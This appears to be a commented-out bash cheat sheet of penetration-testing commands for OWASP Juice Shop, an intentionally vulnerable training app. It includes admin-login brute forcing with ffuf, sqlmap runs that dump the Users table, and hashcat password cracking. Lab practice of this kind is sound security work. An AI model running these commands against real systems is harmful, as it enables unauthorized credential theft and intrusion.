#!/bin/bash
# =============================================
# Example commands for OWASP Juice Shop Pentest
# Target: http://juice-shop:3000
# =============================================

# --- DAST Scanner (Nuclei) ---
# nuclei -u http://juice-shop:3000

# --- Content Discovery (Feroxbuster) ---
# feroxbuster -u http://juice-shop:3000 -w /usr/share/wordlists/dirb/common.txt -t 10 -d 1

# --- Brute Force Login (ffuf) ---
# ffuf -u http://juice-shop:3000/rest/user/login -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' -w /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -fc 401

# --- SQL Injection (SQLmap) ---
# sqlmap -u "http://juice-shop:3000/rest/products/search?q=test" --batch --dbs
# sqlmap -u "http://juice-shop:3000/rest/products/search?q=test" --batch --tables
# sqlmap -u "http://juice-shop:3000/rest/products/search?q=test" --batch -T Users --dump

# --- Hash Identification ---
# hash-identifier

# --- Password Cracking (Hashcat) ---
# hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
